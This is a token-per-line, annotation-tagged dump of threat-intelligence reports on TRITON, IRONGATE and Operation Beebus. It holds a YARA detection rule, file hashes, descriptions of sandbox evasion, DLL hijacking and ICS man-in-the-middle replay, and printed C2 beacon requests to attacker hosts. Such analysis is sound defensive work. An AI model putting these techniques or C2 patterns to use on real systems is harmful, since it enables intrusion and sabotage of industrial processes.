and
pads
the
data
in
to
the
appropriate
format
.

TsLow B_malware.unknown
is
an
additional
attacker
module
that
implements
the
TriStation
UDP
wire
protocol
.
The

TsBase
library
primarily
depends
on
the
ts_exec
method
.

This
method
takes
the
function
code
and
expected
response
code
,
and
serializes
the
commands
payload
over
UDP
.

It
checks
the
response
from
the
controller
against
the
expected
value
and
returns
a
result
data
structure
indicating
success
or
a
False
object
representing
failure
.

8/10

TsLow B_malware.unknown
also
exposes
the
connect
method
used
to
check
connectivity
to
the
target
controller
.

If
invoked
with
no
targets
,
it
runs
the
device
discovery
function
detect_ip
.
This
leverages
a
'
ping
'
message
over
the
TriStation
protocol
using
IP
broadcast
to
find
controllers
that
are
reachable
via
a
router
from
where
the
script
is
invoked
.

Indicators

Filename

Hash
trilog.exe
imain.bin
inject.bin
library.zip

MD5
:
6c39c3f4a08d3d78f2eb973a94bd7718  B_hash

SHA-256
:
e8542c07b2af63ee7e72ce5d97d91036c5da56e2b091aa2afe737b224305d230  B_hash

MD5
:
437f135ba179959a580412e564d3107f  B_hash

SHA-256
:
08c34c6ac9186b61d9f29a77ef5e618067e0bc9fe85cab1ad25dc6049c376949  B_hash

MD5
:
0544d425c7555dc4e9d76b571f31f500  B_hash

SHA-256
:
5fc4b0076eac7aa7815302b0c3158076e3569086c4c6aa2f71cd258238440d14  B_hash

MD5
:
0face841f7b2953e7c29c064d6886523  B_hash

SHA-256
:
bef59b9a3e00a14956e0cd4a1f3e7524448cbe5d3cc1295d95a15b83a3579c59  B_hash

TS_cnames.pyc
MD5
:
e98f4f3505f05bf90e17554fbc97bba9  B_hash

SHA-256
:
2c1d3d0a9c6f76726994b88589219cb8d9c39dd9924bc8d2d02bf41d955fe326  B_hash

TsBase.pyc

MD5
:
288166952f934146be172f6353e9a1f5  B_hash

SHA-256
:
1a2ab4df156ccd685f795baee7df49f8e701f271d3e5676b507112e30ce03c42  B_hash

MD5
:
27c69aa39024d21ea109cc9c9d944a04  B_hash

SHA-256
:
758598370c3b84c6fbb452e3d7119f700f970ed566171e879d3cb41102154272  B_hash

MD5
:
f6b3a73c8c87506acda430671360ce15  B_hash

SHA-256
:

5c776a33568f4c16fee7140c249c0d2b1e0798a96c7a01bfd2d5684e58c9bb32  B_hash
MD5
:
8b675db417cc8b23f4c43f3de5c83438  B_hash

SHA-256
:
c96ed56bf7ee85a4398cc43a98b4db86d3da311c619f17c8540ae424ca6546e1  B_hash

TsHi.pyc  B_malware.unknown

TsLow.pyc B_malware.unknown
sh.pyc

Detection
9/10
rule
TRITON_ICS_FRAMEWORK
meta
:
author
=
'
nicholas.carr
@itsreallynick
'
md5
=
'
0face841f7b2953e7c29c064d6886523  B_hash
'
description
=
'
TRITON
framework
recovered
during
Mandiant
ICS
incident
response
'
strings
:
$python_compiled
=
'
.pyc
'
nocase
ascii
wide
$python_module_01
=
'
__module__
'
nocase
ascii
wide
$python_module_02
=
'
<module>
'
nocase
ascii
wide
$python_script_01
=
'
import
Ts
'
nocase
ascii
wide
$python_script_02
=
'
def
ts_
'
nocase
ascii
wide
$py_cnames_01
=
'
TS_cnames.py
'
nocase
ascii
wide
$py_cnames_02
=
'
TRICON
'
nocase
ascii
wide
$py_cnames_03
=
'
TriStation
'
nocase
ascii
wide
$py_cnames_04
=
'
chassis
'
nocase
ascii
wide
$py_tslibs_01
=
'
GetCpStatus
'
nocase
ascii
wide
$py_tslibs_02
=
'
ts_
'
ascii
wide
$py_tslibs_03
=
'
sequence
'
nocase
ascii
wide
$py_tslibs_04
=
/import
Ts(Hi|Low|Base)[^:alpha:]/
nocase
ascii
wide
$py_tslibs_05
=
/module\s?version/
nocase
ascii
wide
$py_tslibs_06
=
'
bad
'
nocase
ascii
wide
$py_tslibs_07
=
'
prog_cnt
'
nocase
ascii
wide
$py_tsbase_01
=
'
TsBase.py
'
nocase
ascii
wide
$py_tsbase_02
=
'
.TsBase(
'
nocase
ascii
wide
$py_tshi_01
=
'
TsHi.py
'
nocase
ascii
wide
$py_tshi_02
=
'
keystate
'
nocase
ascii
wide
$py_tshi_03
=
'
GetProjectInfo
'
nocase
ascii
wide
$py_tshi_04
=
'
GetProgramTable
'
nocase
ascii
wide
$py_tshi_05
=
'
SafeAppendProgramMod
'
nocase
ascii
wide
$py_tshi_06
=
'
.TsHi(
'
ascii
nocase
wide
$py_tslow_01
=
'
TsLow.py
'
nocase
ascii
wide
$py_tslow_02
=
'
print_last_error
'
ascii
nocase
wide
$py_tslow_03
=
'
.TsLow(
'
ascii
nocase
wide
$py_tslow_04
=
'
tcm_
'
ascii
wide
$py_tslow_05
=
'
TCM
found
'
nocase
ascii
wide
$py_crc_01
=
'
crc.pyc
'
nocase
ascii
wide
$py_crc_02
=
'
CRC16_MODBUS
'
ascii
wide
$py_crc_03
=
'
Kotov
Alaxander
'
nocase
ascii
wide
$py_crc_04
=
'
CRC_CCITT_XMODEM
'
ascii
wide
$py_crc_05
=
'
crc16ret
'
ascii
wide
$py_crc_06
=
'
CRC16_CCITT_x1D0F
'
ascii
wide
$py_crc_07
=
/CRC16_CCITT[^_]/
ascii
wide
$py_sh_01
=
'
sh.pyc
'
nocase
ascii
wide
$py_keyword_01
=
'
FAILURE
'
ascii
wide
$py_keyword_02
=
'
symbol
table
'
nocase
ascii
wide
$py_TRIDENT_01
=
'
inject.bin
'
ascii
nocase
wide
$py_TRIDENT_02
=
'
imain.bin
'
ascii
nocase
wide
condition
:
2
of
(
$python_*
)
and
7
of
(
$py_*
)
and
filesize
<
3MB
10/10
IRONGATE  B_malware.backdoor
ICS
Malware
:
Nothing
to
See
Here...Masking

Malicious
Activity
on
SCADA
Systems

In
the
latter
half
of
2015
,
the
FireEye
Labs
Advanced
Reverse
Engineering
(
FLARE
)
team
identified
several
versions
of
an
ICS-focused
malware
crafted
to
manipulate
a
specific
industrial
process
running
within
a
simulated
Siemens
control
system
environment
.
We
named
this
family
of
malware
IRONGATE  B_malware.backdoor
.

FLARE
found
the
samples
on
VirusTotal
while
researching
droppers
compiled
with
PyInstaller
—
an
approach
used
by
numerous
malicious
actors
.
The
IRONGATE  B_malware.backdoor
samples
stood
out
based
on
their
references
to
SCADA
and
associated
functionality
.
Two
samples
of
the
malware
payload
were
uploaded
by
different
sources
in
2014
,
but
none
of
the
antivirus
vendors
featured
on
VirusTotal
flagged
them
as
malicious
.

Siemens
Product
Computer
Emergency
Readiness
Team
(
ProductCERT
)
confirmed
that
IRONGATE  B_malware.backdoor
is
not
viable
against
operational
Siemens
control
systems
and
determined
that
IRONGATE  B_malware.backdoor
does
not
exploit
any
vulnerabilities
in
Siemens
products
.
We
are
unable
to
associate
IRONGATE  B_malware.backdoor
with
any
campaigns
or
threat
actors
.
We
acknowledge
that
IRONGATE  B_malware.backdoor
could
be
a
test
case
,
proof
of
concept
,
or
research
activity
for
ICS
attack
techniques
.

Our
analysis
finds
that
IRONGATE  B_malware.backdoor
invokes
ICS
attack
concepts
first
seen
in
Stuxnet
,
but
in
a
simulation
environment
.
Because
the
body
of
industrial
control
systems
(
ICS
)
and
supervisory
control
and
data
acquisition
(
SCADA
)
malware
is
limited
,
we
are
sharing
details
with
the
broader
community
.

Malicious
Concepts

Deceptive
Man-in-the-Middle

IRONGATE B_malware.backdoor
key
feature
is
a
man-in-the-middle
(
MitM
)
attack
against
process
input-output
(
IO
)
and
process
operator
software
within
industrial
process
simulation
.
The
malware
replaces
a
Dynamic
Link
Library
(
DLL
)
with
a
malicious
DLL
,
which
then
acts
as
a
broker
between
a
PLC
and
the
legitimate
monitoring
software
.
This
malicious
DLL
records
five
seconds
of
'
normal
'
traffic
from
a
PLC
to
the
user
interface
and
replays
it
,
while
sending
different
data
back
to
the
PLC
.
This
could
allow
an
attacker
to
alter
a
controlled
process
unbeknownst
to
process
operators
.

Sandbox
Evasion

IRONGATE's  B_malware.backdoor
second
notable
feature
involves
sandbox
evasion
.
Some
droppers
for
the
IRONGATE  B_malware.backdoor
malware I
would
not
run
if
VMware
or
Cuckoo
Sandbox
environments
were
employed
.
The
malware
uses
these
techniques
to
avoid
detection
and
resist
analysis
,
and
developing
these
anti-sandbox
techniques
indicates
that
the
author
wanted
the
code
to
resist
casual
analysis
attempts
.
It
also
implies
that
IRONGATE's  B_malware.backdoor
purpose
was
malicious
,
as
opposed
to
a
tool
written
for
other
legitimate
purposes
.

Dropper
Observables

We
first
identified
IRONGATE  B_malware.backdoor
when
investigating
droppers
compiled
with
PyInstaller
—
an
approach
used
by
numerous
malicious
actors
.
In
addition
,
strings
found
in
the
dropper
include
the
word
'
payload
'
,
which
is
commonly
associated
with
malware
.

Unique
Features
for
ICS
Malware

While
IRONGATE  B_malware.backdoor
malware I
does
not
compare
to
Stuxnet
in
terms
of
complexity
,
ability
to
propagate
,
or
geopolitical
implications
,
IRONGATE  B_malware.backdoor
leverages
some
of
the
same
features
and
techniques
Stuxtnet
used
to
attack
centrifuge
rotor
speeds
at
the
Natanz
uranium
enrichment
facility;
it
also
demonstrates
new
features
for
ICS
malware
.

Both
pieces
of
malware
look
for
a
single
,
highly
specific
process
.

Both
replace
DLLs
to
achieve
process
manipulation
.

IRONGATE  B_malware.backdoor
detects
malware
detonation/observation
environments
,
whereas
Stuxnet
looked
for
the
presence
of
antivirus
software
.

IRONGATE  B_malware.backdoor
actively
records
and
plays
back
process
data
to
hide
manipulations
,
whereas
Stuxnet
did
not
attempt
to
hide
its
process
manipulation
,
but
suspended
normal
operation
of
the
S7-315
so
even
if
rotor
speed
had
been
displayed
on
the
HMI
,
the
data
would
have
been
static
.

A
Proof
of
Concept

IRONGATE's  B_malware.backdoor B_malware.backdoor
characteristics
lead
us
to
conclude
that
it
is
a
test
,
proof
of
concept
,
or
research
activity
.

The
code
is
specifically
crafted
to
look
for
a
user-created
DLL
communicating
with
the
Siemens
PLCSIM
environment
.
PLCSIM
is
used
to
test
PLC
program
functionality
prior
to
in-field
deployment
.
The
DLLs
that
IRONGATE  B_malware.backdoor
seeks
and
replaces
are
not
part
of
the
Siemens
standard
product
set
,
but
communicate
with
the
S7ProSim
COM
object
.
Malware
authors
test
concepts
using
commercial
simulation
software
.

Code
in
the
malicious
software
closely
matched
usage
on
a
control
engineering
blog
dealing
with
PLCSIM
(
https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/ B_url.normal
and
https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/ B_url.normal
)
.

While
we
have
identified
and
analyzed
several
droppers
for
the
IRONGATE  B_malware.backdoor
malware
,
we
have
yet
to
identify
the
code's
infection
vector
.

In
addition
,
our
analysis
did
not
identify
what
triggers
the
MitM
payload
to
install;
the
scada.exe B_malware.unknown
binary
that
deploys
the
IRONGATE  B_malware.backdoor
DLL
payload
appears
to
require
manual
execution
.

We
have
not
identified
any
other
instances
of
the
ICS-specific
IRONGATE  B_malware.backdoor
components
(
scada.exe B_malware.unknown
and
Step7ProSim.dll
)
,
despite
their
having
been
compiled
in
September
of
2014
.

Siemens
ProductCERT
has
confirmed
that
the
code
would
not
work
against
a
standard
Siemens
control
system
environment
.

Implications
for
ICS
Asset
Owners

Even
though
process
operators
face
no
increased
risk
from
the
currently
identified
members
of
the
IRONGATE  B_malware.backdoor
malware I
family
,
IRONGATE  B_malware.backdoor
provides
valuable
insight
into
adversary
mindset
.

Network
security
monitoring
,
indicator
of
compromise
(
IoC
)
matching
,
and
good
practice
guidance
from
vendors
and
other
stakeholders
represent
important
defensive
techniques
for
ICS
networks
.

To
specifically
counter
IRONGATE's  B_malware.backdoor B_malware.backdoor
process
attack
techniques
,
ICS
asset
owners
may
,
over
the
longer
term
,
implement
solutions
that
:

Require
integrity
checks
and
code
signing
for
vendor
and
user
generated
code
.
Lacking
cryptographic
verification
facilitates
file
replacement
and
MitM
attacks
against
controlled
industrial
processes
.

Develop
mechanisms
for
sanity
checking
IO
data
,
such
as
independent
sensing
and
backhaul
,
and
comparison
with
expected
process
state
information
.
Ignorance
of
expected
process
state
facilitates
an
attacker's
ability
to
achieve
physical
consequence
without
alarming
operators
.

Technical
Malware
Analysis

IRONGATE  B_malware.drop
Dropper I
Family

FireEye
has
identified
six
IRONGATE  B_malware.drop
Dropper I
:
bla.exe  B_malware.drop
,
update.exe1  B_malware.drop
,
update_no_pipe.exe1  B_malware.drop
,
update_no_pipe.exe2  B_malware.drop
,
update_no_pipe.exe2  B_malware.drop
,
update.exe3  B_malware.drop
.
All
but
one
of
these
Python-based
droppers
first
checks
for
execution
in
a
VMware
or
Cuckoo
Sandbox
environment
.
If
found
,
the
malware
exits
.

If
not
found
,
the
IRONGATE  B_malware.drop
dropper I
extracts
a
UPX-packed
,
publicly
available
utility
(
NirSoft
NetResView
version
1.27
)
to
audiodg.exe
in
the
same
directory
as
the
dropper
.
The
dropper
then
executes
the
utility
using
the
command
audiodg.exe
/scomma
scxrt2.ini
.
This
command
populates
the
file
scxrt2.ini
with
a
comma-separated
list
of
network
resources
identified
by
the
host
system
.

The
dropper
iterates
through
each
entry
in
scxrt2.ini
,
looking
for
paths
named
move-to-operational
or
move-tooperational.lnk
.
If
a
path
is
found
,
the
dropper
first
extracts
the
Base64-encoded
.NET
executable
scada.exe B_malware.unknown
to
the
current
directory
and
then
moves
the
file
to
the
path
containing
move-to-operational
or
move-to-operational.lnk
.
The
path
move-to-operational
is
interesting
as
well
,
perhaps
implying
that
IRONGATE  B_malware.backdoor
was
not
seeking
the
actual
running
process
,
but
rather
a
staging
area
for
code
promotion
.
The
dropper
does
not
execute
the
scada.exe B_malware.unknown
payload
after
moving
it
.

Anti-Analysis
Techniques

Each
IRONGATE  B_malware.drop
dropper I
currently
identified
deploys
the
same
.NET
payload
,
scada.exe B_malware.unknown
.
All
but
one
of
the
droppers
incorporated
anti-detection/analysis
techniques
to
identify
execution
in
VMware
or
the
Cuckoo
Sandbox
.
If
such
environments
are
detected
,
the
dropper
will
not
deploy
the
.NET
executable
(
scada.exe B_malware.unknown
)
to
the
host
.

Four
of
the
droppers B_malware.drop
(
update.exe1 B_malware.drop
,
update_no_pipe.exe1 B_malware.drop
,
update_no_pipe.exe2 B_malware.drop
,
and
update.exe3 B_malware.drop
)
detect
Cuckoo
environments
by
scanning
subdirectories
of
the
%SystemDrive%
.
Directories
with
names
greater
than
five
,
but
fewer
than
ten
characters
are
inspected
for
the
subdirectories
drop
,
files
,
logs
,
memory
,
and
shots
.
If
a
matching
directory
is
found
,
the
dropper
does
not
attempt
to
deploy
the
scada.exe B_malware.unknown
payload
.

The
update.exe1 B_malware.drop
and
update.exe3 B_malware.drop
droppers  I
contain
code
for
an
additional
Cuckoo
check
using
the
SysInternals
pipelist
program
,
install.exe
,
but
the
code
is
disabled
in
each
.

The
update.exe2 B_malware.drop
dropper I
includes
a
check
for
VMware
instead
of
Cuckoo
.
The
VMWare
check
looks
for
the
registry

HKLM\SOFTWARE\VMware
,
Inc.\VMware
Tools
and
the
files
%WINDIR%\system32\drivers\vmmouse.sys
and
%WINDIR%\system32\drivers\vmhgfs.sys
.
If
any
of
these
are
found
,
the
dropper
does
not
attempt
to
deploy
the
scada.exe B_malware.unknown
payload
.

The
dropper B_malware.drop
bla.exe I
does
not
include
an
environment
check
for
either
Cuckoo
or
VMware
.
scada.exe B_malware.unknown
Payload

We
surmise
that
scada.exe B_malware.unknown
is
a
user-created
payload
used
for
testing
the
malware
.
First
,
our
analysis
did
not
indicate
what
triggers
scada.exe B_malware.unknown
to
run
.
Second
,
Siemens
ProductCERT
informed
us
that
scada.exe B_malware.unknown
is
not
a
default
file
name
associated
with
Siemens
industrial
control
software
.

When
scada.exe B_malware.unknown
executes
,
it
scans
drives
attached
to
the
system
for
filenames
ending
in
Step7ProSim.dll
.

According
to
the
Siemens
ProductCERT
,
Step7ProSim.dll
is
not
part
of
the
Siemens
PLCSIM
software
.
We
were
unable
to
determine
whether
this
DLL
was
created
specifically
by
the
malware
author
,
or
if
it
was
from
another
source
,
such
as
example
code
or
a
particular
custom
ICS
implementation
.
We
surmise
this
DLL
simulates
generation
of
IO
values
,
which
would
normally
be
provided
by
an
S7-based
controller
,
since
the
functions
it
includes
appear
derived
from
the
Siemens
PLCSIM
environment
.

If
scada.exe B_malware.unknown
finds
a
matching
DLL
file
name
,
it
kills
all
running
processes
with
the
name
biogas.exe
.
The
malware B_malware.backdoor
then
moves
Step7ProSim.dll
to
Step7ConMgr.dll
and
drops
a
malicious
Step7ProSim.dll
–
the
IRONGATE  B_malware.backdoor
payload I
–
to
the
same
directory
.

The
malicious
Step7ProSim.dll
acts
as
an
API
proxy
between
the
original
user-created
Step7ProSim.dll
(
now
named
Step7ConMgr.dll
)
and
the
application
biogas.exe
that
loads
it
.
Five
seconds
after
loading
,
the
malicious

Step7ProSim.dll
records
five
seconds
of
calls
to
ReadDataBlockValue
.
All
future
calls
to
ReadDataBlockValue
return
the
recorded
data
.

Simultaneously
,
the
malicious
DLL
discards
all
calls
to
WriteDataBlockValue
and
instead
calls
WriteInputPoint
(
0x110
,
0
,
0x7763
)
and
WriteInputPoint
(
0x114
,
0
,
0x7763
)
every
millisecond
.
All
of
these
functions
are
named
similarly
to
Siemens
S7ProSim
v5.4
COM
interface
.
It
appears
that
other
calls
to
API
functions
are
passed
through
the
malicious
DLL
to
the
legitimate
DLL
with
no
other
modification
.

Biogas.exe

As
mentioned
previously
,
IRONGATE  B_malware.backdoor
seeks
to
manipulate
code
similar
to
that
found
on
a
blog
dealing
with
simulating
PLC
communications
using
PLCSIM
,
including
the
use
of
an
executable
named
biogas.exe
.

Examination
of
the
executable
from
that
blog's
demo
code
shows
that
the
WriteInputPoint
function
calls
with
byte
indices
0x110
and
0x114
set
pressure
and
temperature
values
,
respectively
:

IRONGATE  B_malware.backdoor
:

WriteInputPoint
(
0x110
,
0
,
0x7763
)

WriteInputPoint
(
0x114
,
0
,
0x7763
)

Equivalent
pseudo
code
from
Biogas.exe
:

S7ProSim.WriteInputPoint
(
0x110
,
0
,
(
short
)
this.Pressure.Value
)

S7ProSim.WriteInputPoint
(
0x114
,
0
,
(
short
)
this.Temperature.Value
)

We
have
been
unable
to
determine
the
significance
of
the
hardcoded
value
0x7763
,
which
is
passed
in
both
instances
of
the
write
function
.

Because
of
the
noted
indications
that
IRONGATE  B_malware.backdoor
is
a
proof
of
concept
,
we
cannot
conclude
IRONGATE's  B_malware.backdoor B_malware.backdoor
author
intends
to
manipulate
specific
temperature
or
pressure
values
associated
with
the
specific
biogas.exe
process
,
but
find
the
similarities
to
this
example
code
striking
.

Artifacts
and
Indicators

PyInstaller
Artifacts

The
IRONGATE  B_malware.backdoor
droppers
are
Python
scripts
converted
to
executables
using
PyInstaller
.
The
compiled
droppers
contain
PyInstaller
artifacts
from
the
system
the
executables
were
created
on
.
These
artifacts
may
link
other
samples
compiled
on
the
same
system
.
Five
of
the
six
file
droppers
(
bla.exe B_malware.drop
,
update.exe1 B_malware.drop
,
update_no_pipe.exe1 B_malware.drop
,
update_no_pipe.exe2 B_malware.drop
and
update.exe3 B_malware.drop
)
all
share
the
same
PyInstaller
artifacts
listed
in
Table B_malware.unknown
1
.

Table B_malware.unknown
1
:
Pyinstaller
Artifacts

The
remaining
dropper B_malware.drop
,
update.exe2
,
contains
the
artifacts
listed
in
Table B_malware.unknown
2
.

Table B_malware.unknown
2
:
Pyinstaller
Artifacts
for
update.exe2 B_malware.drop

Unique
Strings

Figure
1
and
2
list
the
unique
strings
discovered
in
the
scada.exe B_malware.unknown
and
Step7ProSim.dll
binaries
.

Figure
1
:
scada.exe B_malware.unknown
Unique
Strings

Figure
2
:
Step7ProSim.dll
Unique
Strings

File
Hashes

Table B_hash
3
contains
the
MD5
hashes
,
file
and
architecture
type
,
and
compile
times
for
the
malware
analyzed
in
this
report
.

Table B_hash
3
:
File
MD5
Hashes
and
Compile
Times

FireEye
detects
IRONGATE  B_malware.backdoor
.
A
list
of
indicators
can
be
found
here
.

Special
thanks
to
the
Siemens
ProductCERT
for
providing
support
and
context
to
this
investigation
.
OPERATION
Beebus  B_malware.infosteal

FireEye
discovered
an
APT
campaign
consistently
targeting
companies
in
the
aerospace
and
defense
industries
.
The
campaign
has
been
in
effect
for
sometime
now
.

Infection
Vector

We
have
seen
this
campaign
use
both
email
and
drive­by
downloads
as
a
means
of
infecting
end
users
.
The
threat
actor
has
consistently
used
attachment
names
of
documents/white
papers
released
by
well­known
companies
.
The
malicious
email
attachment
exploits
some
common
vulnerabilities
in
PDF
and
DOC
files
.

PDF
:

DOC
:

PDF
:

DOC
:

PDF
:

DOC
:

Table B_malware.unknown
1

CVE­2011­0611

CVE­2012­0158

CVE­2009­0927

CVE­2010­3333

CVE­2012­0754

malware B_malware.infosteal
uses
a
well­documented
vulnerability
in
the
Windows
OS
known
as
DLL
search
order
hijacking
.
There
is
an
order
in
which
executables
load
DLLs
on
the
Windows
operating
system
.
This
particular
malware
takes
advantage
of
this
vulnerability
and
drops
a
DLL
called
ntshrui.DLL
in
the
C:\Windows
directory
.
The
first
place
from
where
the
executable
looks
to
load
the
DLL
is
its
own
directory
.
By
dropping
the
ntshrui.DLL
in
the
directory
C:\Windows
,
the
malware
achieves
persistence
.

Figures
1
and
2
below
show
the
modified
weaponized
PDF
,
which
was
used
in
the
spear
phishing
attack
.
The
PDF
on
the
left
is
the
non­malicious
version
,
while
the
one
on
the
right
is
malicious
.
As
you
can
see
from
the
pictures
below
,
the
original
PDF
was
modified
using
the
Ghostscript
tool
.
Also
the
size
of
the
malicious
PDF
is
significantly
smaller
than
the
non­malicious
version
.

Figure
1

Figure
2

Figure
3
.
Initial
GET
request

The
malware
communicates
with
a
remote
command
and
control
(
CnC
)
server
.
The
GET
request
in
Figure
4
is
the
initial
request
that
the
compromised
machine
makes
to
'
check
in
'
with
the

CnC
server
.
The
keyword
'
p=2
,
'
which
is
sent
out
as
part
of
the
URI
,
appears
to
indicate
the
version
of
the
malware
.
Mining
our
database
we
found
three
versions
of
this
malware
and
they
are
noted
in
the
table
below
.
The
version
value
is
hard­coded
in
the
ntshrui.DLL
file
in
the
samples
we
observed
.

Figure
4
.
Encrypted
data
sent
to
CnC

It
encrypts
information
it
collects
with
the
base64
algorithm
and
then
sends
it
to
the
remote
CnC
server
as
seen
in
Figure
4
.
It
is
interesting
to
note
that
the
base64
data
is
subjected
to
some
substitutions
before
it
is
sent
out
preventing
run
of
the
mill
inspection
on
the
wire
.
It
replaces
the
'
/
'
(
forward
slash
)
and
'
+
'
(
plus
)
characters
which
are
part
of
the
base64
character
set
with
'
_
'
(
underscore
)
and
'
­
'
(
hyphen
)
respectively
.
The
code
that
performs
this
operation
is
shown
in
Figure
5
.

Figure
5

A
sample
of
the
data
that
is
encrypted
and
sent
to
the
CnC
server
for
version
'
p=2
'
is
seen
in
the
memory
dump
shown
in
Figure
6
.
At
offset
4­-7
it
contains
a
time­based
counter
.
It
uses
the
keyword
'
osamu
'
in
this
instance
to
identify
this
particular
campaign
.
The
campaign
keywords
are
not
sent
out
in
version
'
p=1
'
but
can
still
be
found
hardcoded
in
the
DLL
payload
.
The
hostname
and
OS
information
are
also
included
in
the
beacon
.
It
awaits
further
commands
from
the
CnC
server
in
response
to
the
data
sent
out
.

Figure
6

It
has
modules
to
capture
system
information
(
processor
,
disk
,
memory
,
OS
)
,
process
id
,
process
start
time
,
and
current
user
information
.
It
also
contains
a
module
to
download
and
execute
additional
payloads
and
updates
.
It
downloads
in
to
%TEMP%
directory
and
calls
CreateProcessA
to
invoke
execution
as
seen
below
:

Figure
7

Figure
8

The
POST
request
looks
very
similar
to
the
GET
request
and
uses
base64
encoding
to
encode
the
URI
.
4/10/2016

POST
/s/asp
?
__uLBwO1bAMKBgG2BQAAAAEAAAACAAAAAAAAAG9zYW11AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVwBJAE4ARABPAFcAUwBNAEEAQQBOAEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==p=2

HTTP/1.1

Operation
Beebus  B_malware.infosteal
'
Threat
Research
Blog
|
FireEye
Inc

User­Agent
:
Mozilla/4.0
(
compatible;
)

Accept
:
*/*

Host
:

Content­Length
:
563

Connection
:
Keep­Alive

Cache­Control
:
no­cache

The
malware
collects
the
following
information
from
the
compromised
machine
.
1
)
Type
of
Processor
2
)
CPU
Speed
3
)
Figures
out
the
product
type
by
querying
the
\SYSTEM\CurrentControlSet\Control\ProductOptions\ProductType
registry
key
.
4
)
Memory
Usage

Figure
9

The
malware
is
fairly
noisy
sending
multiple
GET
requests
.
In
our
test
environment
we
observed
that
the
POST
request
started
a
couple
of
hours
after
the
malware
initially
checked
in
with
the
CnC
.
Around
the
same
time
we
also
noticed
a
new
exe
get
dropped
under
'
C:\Documents
And
Settings\Administrator\Local
Setting\Temp~ISUN32.exe
'
.
The
two
figures
below
show
the

ISUN32.exe
process
start
up
and
the
exe
get
dropped
under
TEMP
directory
.

Figure
10

Figure
11

We
have
a
full
list
which
summarizes
the
attachment
names
,
campaign
codes
,
and
campaign
duration
of
this
particular
operation
.
The
table
also
includes
the
md5sum
of
the
malware
payloads
.
Below
is
a
subset
of
attachment
names
that
we
have
observed
.
We
are
willing
to
share
additional
information
with
the
security
community
.
Please
contact
research
at
fireeye
dot
com
for
more
information
.

Operation
Beebus  B_malware.infosteal
'
Threat
Research
Blog
|
FireEye
Inc
sensor
environments.doc

Global_A&D_outlook_2012.pdf

FY2013_Budget_Request
.doc

Understand
your
blood
test
report.pdf

RHT_SalaryGuide_2012.pdf

Security
Predictions
for
2012
and
2013.pdf

April
Is
the
Cruelest
Month.pdf

National
Human
Rights
Action
Plan
of
China
(
2012­2015).pdf

Dept
of
Defense
FY12
A
STTR
Solicitation
Topics
of
Interest
to
Boeing.pdf

Boeing_Current_Market_Outlook_2011_to_2030.pdf

RHT_SalaryGuide_2012.pdf
dodd­frank­conflict­minerals.doc

Conflict­Minerals­Overview­for­KPMG.doc
сообщить.doc

Timeline
of
the
Beebus  B_malware.infosteal
Campaign

From
the
timeline
below
,
we
were
able
to
figure
out
that
this
campaign
has
been
targeting
companies
in
the
Aerospace
and
Defense
vertical
in
waves
.
There
is
no
specific
pattern
to
this
attack
,
we
have
seen
days
on
which
multiple
weaponized
emails
were
sent
to
several
companies
,
and
on
other
days
we
observed
that
the
threat
actor
sent
only
one
email
to
a
specific
target
organization
.
The
chart
below
shows
Beebus  B_malware.infosteal
attacks
in
the
last
year
.

ORIGIN/THREAT
ACTOR
ATTRIBUTION
:

The
term
'
Beebus  B_malware.infosteal
'
was
coined
from
an
initial
sample
in
this
campaign
(
MD5
:
7ed557921ac60dfcb295ebabfd972301  B_hash
)
,
which
was
originally
submitted
to
VirusTotal
on
April
12
,
2011.[1]
After
this
executable
compromises
the
endpoint
,
this
sample
then
generated
command
and
control
traffic
to
:

GET
/s/asp?XAAAAM4w5jmOS_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1
HTTP/1.1

User­Agent
:
Mozilla/4.0
(
compatible;
)

Accept
:
*/*

Host
:
bee.businessconsults.net

As
early
as
March
2011
,
Joe
Stewart
at
Dell
SecureWorks
reported
that
various
subdomains
off
the
primary
domain
of
'
businessconsults.net
'
have
acted
as
command
and
control
nodes
for
the
well­known
'
HUC
Packet
Transmit
Tool
'
(
aka
'
HTran')[2]
,
which
is
a
light­-weight
TCP
proxy
tool
used
by
the
nation
state
threat
actor
that
breached
RSA
around
that
time
,
labeled
by

McAfee
as
'
Operation
Shady
RAT.'[3]
According
to
McAfee
,
one
of
the
major
tools
,
techniques
,
and
procedures
(
TTPs
)
used
by
this
threat
actor
was
their
use
of
obfuscated
or
encrypted
HTML
comments
embedded
in
otherwise
benign
websites
,
in
order
to
indirectly
control
compromised
endpoints
.

As
such
,
this
TTP
of
obfuscated/encrypted
HTML
comments
has
been
also
widely
reported
in
the
media
as
associated
with
the
nation
state
group
called
'
Comment
Group
'
or
'
Comment
Team
,
'
which
is
believed
to
be
associated
with
the
Chinese
government.[4]
Bloomberg
reports
that
various
US
intelligence
sources
have
labeled
this
activity
as
'
Byzantine
Candor
'
,
accordingly.[5]

Based
upon
these
correlations
,
we
believe
Beebus  B_malware.infosteal
to
be
yet
another
TTP
associated
with
threat
actors
based
in
China
.

Another
related
sample
(
MD5
:
d7ec457be3fad8057580e07cae74becb  B_hash
)
was
originally
submitted
to
VirusTotal
on
Sept
.
23
,
2011[6]
and
generates
the
following
'
Beebus  B_malware.infosteal
'
traffic
pattern
:

GET
/s/asp?XAAAAM4w5jmIa_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1
HTTP/1.1

User­Agent
:
Mozilla/4.0
(
compatible;
)

Accept
:
*/*

Host
:
68.96.31.136

Siilarly
,
the
IP
address
(
68.96.31.136  B_ip.normal
)
was
another
C2
node
reported
by
Dell
SecureWorks
as
hosting
the
HTran
proxy
infrastructure.[7]
[1]
https://www.virustotal.com/search/query=7ed557921ac60dfcb295ebabfd972301  B_url.normal
[2]
http://www.secureworks.com/cyber­threat­intelligence/threats/htran/  B_url.normal
[3]
http://www.mcafee.com/us/resources/white­papers/wp­operation­shady­rat.pdf  B_url.normal
[4]
http://www.bloomberg.com/news/2012­07­26/china­hackers­hit­eu­point­man­and­d­c­with­byzantine­candor.html  B_url.normal
[5]
http://www.bloomberg.com/news/2012­07­26/china­hackers­hit­eu­point­man­and­d­c­with­byzantine­candor.html  B_url.normal
[6]
https://www.virustotal.com/search/query=d7ec457be3fad8057580e07cae74becb  B_url.normal
[7]
http://www.secureworks.com/cyber­threat­intelligence/threats/htran/  B_url.normal
WHITE
PAPER

OPERATION
